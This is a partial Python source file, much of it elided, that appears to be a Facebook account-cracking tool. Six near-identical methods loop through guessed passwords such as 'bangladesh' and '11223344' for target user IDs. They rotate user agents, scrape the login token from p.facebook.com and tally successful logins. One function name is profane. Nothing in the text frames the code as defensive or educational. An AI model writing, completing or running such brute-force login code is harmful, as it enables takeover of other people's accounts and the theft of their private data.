...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print(" \033[38;5;195m[•] \033[1;96m Example : \033[1;92mfreefire, \033[1;94mbangladesh , \033[1;95m11223344, \033[1;92mEnc ")
    print(balpakna)
...
def HASAN(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M1\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def XUDI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M2\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
...
def SORNA(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M3\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def XXX(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M4\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def SATTAR(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M5\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def MUNNI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mŠHÃMÎUŁ-M6\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
